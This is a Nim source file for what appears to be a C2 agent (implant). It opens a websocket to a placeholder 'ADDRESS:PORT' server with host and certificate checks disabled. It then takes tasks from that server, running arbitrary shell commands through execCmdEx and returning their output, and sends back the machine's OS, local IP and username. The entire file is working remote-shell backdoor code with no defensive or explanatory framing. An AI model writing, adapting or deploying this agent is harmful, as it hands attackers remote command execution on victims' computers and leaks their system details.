import os
import net
import osproc
import std/json
import strutils
import strformat
import chronos
import libsodium/sodium
import libsodium/sodium_sizes
import websock/[websock, extensions/compression/deflate]

proc virtualCd(dir, input: string) =
  let rawPath = input.strip()
  var path =
    if rawPath.startsWith("cd "):
      rawPath[3..^1].strip()
    else:
      rawPath

  if path.isAbsolute():
    setCurrentDir(path)
  else:
    var result = dir & "/" & path
    setCurrentDir(result.normalizedPath().absolutePath())

proc main() {.async.} =
    # OS
    let os = $hostOS
    # IP
    let sock = newSocket()
    sock.connect("ADDRESS", Port(PORT))
    let ip = sock.getLocalAddr()[0]
    sock.close()
    # User
    let user = getEnv("USER", getEnv("USERNAME", "unknown"))
    # Directory
    var dir = getCurrentDir()
    # Connect
    let ws = await WebSocket.connect("ADDRESS:PORT", path = "/wss", secure = true, flags = {TLSFlags.NoVerifyHost, TLSFlags.NoVerifyServerName})
    await ws.send("Hello from AGENT")

    while true:
      try:
        var req = await ws.recv()
        if req.len <= 0:
          break
        else:
          var task = parseJson(cast[string](req))

          # Exit
          if task["code"].getInt() == 0:
            await ws.send("Done")
            await ws.close()
            break

          # Shell
          if task["code"].getInt() == 1:
            if task["data"].getStr().startsWith("cd "):
              virtualCd(dir, task["data"].getStr())
              dir = getCurrentDir()
              await ws.send(dir & "\n")
            else:
              let command = execCmdEx(task["data"].getStr())
              await ws.send(command.output)

          # Custom command example - host info
          if task["code"].getInt() == 2:
            let output = "OS: " & os & "\n" & "IP: " & ip & "\n" & "USER: " & user
            await ws.send(output)

      except:
        continue

waitFor main()
